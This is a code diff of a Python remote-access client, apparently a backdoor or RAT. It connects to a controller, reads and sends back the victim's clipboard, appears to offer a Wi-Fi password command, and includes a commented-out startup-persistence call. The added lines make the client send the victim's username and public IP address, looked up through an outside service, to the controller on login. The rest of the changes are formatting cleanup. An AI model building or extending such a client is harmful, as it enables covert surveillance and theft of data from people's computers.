@@ -10,6 +10,8 @@ import requests
 import os
 import socket
 import subprocess
+import getpass
+import json
 
 
 def imports():
@@ -50,7 +52,7 @@ time.sleep(.1)
 
 engine = pyttsx3.init()
 voices = engine.getProperty('voices')
-engine.setProperty('rate',200)
+engine.setProperty('rate', 200)
 engine.setProperty('voice', voices[1].id)
 engine.runAndWait()
 
@@ -81,7 +83,8 @@ def login():
         lr = str(connection.recv(1024), "utf-8")
         if lr == passwd:
             connection.send(str.encode(logsuc))
-            connection.send(str.encode(oss))
+            connection.send(str.encode(json.dumps(
+                [oss, getpass.getuser(), requests.get('https://api.ipify.org/').text])))
             break
         elif lr != passwd:
             connection.send(str.encode(logfail))
@@ -127,14 +130,15 @@ def run_commands():
             elif " ".join(ldata) == "clipboard get":
                 if "win" in oss:
                     clipboard_content = subprocess.check_output(
-                                "powershell get-clipboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        "powershell get-clipboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     connection.send(str.encode(str(clipboard_content)))
                 elif "mac" in oss:
                     clipboard_content = subprocess.check_output(
-                                "pbpaste", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        "pbpaste", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     connection.send(str.encode(str(clipboard_content)))
                 else:
-                    connection.send(str.encode("Sorry, but this command is only available for windows and mac os"))
+                    connection.send(str.encode(
+                        "Sorry, but this command is only available for windows and mac os"))
             elif ldata == "wifipass" or ldata == "wifi pass":
                 pn = 0
                 dub = 9
@@ -204,6 +208,7 @@ def run_commands():
                 print(e)
         login()
         run_commands()
+
 
 # start_up()
 # If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
